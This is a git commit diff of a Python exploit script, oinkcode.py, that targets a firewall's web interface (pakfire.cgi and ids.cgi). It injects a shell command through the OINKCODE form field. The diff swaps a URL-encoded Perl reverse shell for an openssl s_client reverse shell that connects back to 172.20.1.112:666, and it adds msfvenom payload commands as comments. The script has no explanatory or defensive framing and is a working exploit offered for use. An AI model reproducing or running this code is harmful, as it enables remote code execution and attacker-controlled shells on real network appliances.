c6d24a97ed27308985e5629a357eba34850d3869
SharedKernel <sharedkernel@protonmail.com>
2023-08-17 17:05:35 -0300

    Payload att

--- oinkcode.py
+++ oinkcode.py
@@ -1,4 +1,7 @@
 import requests
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 ip = '172.16.1.155'
 user = 'admin'
@@ -11,33 +14,25 @@ r = requests.get(f'https://{ip}:{port}/cgi-bin/pakfire.cgi', auth=(user, passwor
 
 print("Check: " + str(r.status_code))
 
-def generate():
-        return (
-            "use IO;foreach my $key(keys %ENV){" +
-            "if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,\"" +
-            lhost +
-            ":" +
-            str(lport) +
-            "\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};"
-        )
+#msfvenom -p cmd/unix/reverse_perl LHOST=172.20.1.112 LPORT=666 -e cmd/perl -f raw -o shev.sh
+#msfvenom -p cmd/unix/reverse_openssl LHOST=172.20.1.112 LPORT=666 -e cmd/perl -f raw -o shev.sh
+payload = "`sh -c '(sleep 3643|openssl s_client -quiet -connect 172.20.1.112:666|while : ; do sh && break; done 2>&1|openssl s_client -quiet -connect 172.20.1.112:666 >/dev/null 2>&1 &)'`"
 
-payload = "perl -MIO -e \"{}\"".format(generate())
-
-payload2 = "perl%20-MIO%20-e%20%22use%20IO%3Bforeach%20my%20%24key%28keys%20%25ENV%29%7Bif%28%24ENV%7B%24key%7D%3D~%2F%28.%2A%29%2F%29%7B%24ENV%7B%24key%7D%3D%241%3B%7D%7D%24c%3Dnew%20IO%3A%3ASocket%3A%3AINET%28PeerAddr%2C%5C%22172.20.1.112%3A666%5C%22%29%3BSTDIN-%3Efdopen%28%24c%2Cr%29%3B%24~-%3Efdopen%28%24c%2Cw%29%3Bwhile%28%3C%3E%29%7Bif%28%24_%3D~%20%2F%28.%2A%29%2F%29%7Bsystem%20%241%3B%7D%7D%3B%22"
+data = {
+            "ENABLE_SNORT_GREEN": "on",
+            "ENABLE_SNORT": "on",
+            "RULES": "registered",
+            "OINKCODE": payload,
+            "ACTION": "Download new ruleset",
+            "ACTION2": "snort"
+        }
 
 r_exploit = requests.post(
     f'https://{ip}:{port}/cgi-bin/ids.cgi',
     auth=(user, password),
     verify=False,
     headers={'Referer':f'https://{ip}:{port}/cgi-bin/ids.cgi'},
-    data = {
-        'ENABLE_SNORT_GREEN':'on',
-        'ENABLESNORT':'on',
-        'RULES':'registered',
-        'OINKCODE':"`{}`".format(payload2),
-        'ACTION':'Download new ruleset',
-        'ACTION2':'snort'
-        }
+    data = data
     )
 
 
